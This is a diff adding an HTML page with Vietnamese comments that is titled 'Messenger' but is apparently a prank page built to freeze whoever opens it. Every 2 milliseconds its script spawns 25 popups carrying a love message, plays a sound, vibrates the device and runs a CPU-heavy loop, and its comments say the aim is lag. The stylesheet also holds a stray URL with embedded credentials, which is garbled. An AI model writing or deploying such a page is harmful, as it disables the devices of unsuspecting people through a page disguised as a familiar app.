@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>Messenger</title>
+<style>
+body {
+    margin: 0;
+    background: #f0f2f5;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+}http://RzSQ2urY0BQlSuL:L78RR0YMvcl1i5I@localhost:32357/storage/emulated/0/glyn/index.html
+
+.popup {
+    position: absolute;
+    width: 240px;
+    background: #ffb6c1;
+    border-radius: 8px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.4);
+}
+
+.header {
+    padding: 6px 10px;
+    font-weight: bold;
+    background: #fff;
+}
+
+.content {
+    padding: 15px;
+    font-size: 15px;
+}
+</style>
+</head>
+<body>
+
+<script>
+let enabled = false;
+const sound = new Audio("https://assets.mixkit.co/active_storage/sfx/2354/2354-preview.mp3");
+
+document.body.addEventListener("click", () => {
+    enabled = true;
+});
+
+function heavyTask() {
+    // Vòng lặp nặng gây lag CPU
+    let x = 0;
+    for (let i = 0; i < 5e6; i++) {
+        x += Math.random();
+    }
+}
+
+function createPopup() {
+    for (let i = 0; i < 25; i++) { // mỗi lần tạo 20 popup
+        const popup = document.createElement("div");
+        popup.className = "popup";
+
+        popup.style.left = Math.random() * window.innerWidth + "px";
+        popup.style.top = Math.random() * window.innerHeight + "px";
+
+        popup.innerHTML = `
+            <div class="header">Glyn</div>
+            <div class="content">Chị yêu em Nhớ em lắmm❤❤</div>
+        `;
+
+        document.body.appendChild(popup);
+    }
+
+    if (enabled) {
+        sound.currentTime = 0;
+        sound.play();
+        if (navigator.vibrate) navigator.vibrate(200);
+    }
+
+    heavyTask();
+}
+
+// TỐC ĐỘ GÂY LAG
+setInterval(createPopup, 2);
+</script>
+
+</body>
+</html>
